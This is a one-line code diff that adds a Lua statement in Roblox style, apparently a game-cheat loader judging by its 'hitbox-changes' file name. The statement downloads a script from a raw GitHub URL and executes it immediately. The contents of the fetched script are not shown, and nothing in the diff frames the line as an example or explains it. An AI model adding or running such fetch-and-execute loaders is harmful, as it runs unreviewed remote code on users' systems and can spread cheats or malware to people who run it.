@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/hitbox-changes-azure-latch-spam7-1m07yjqkhgvsmn.lua"))()
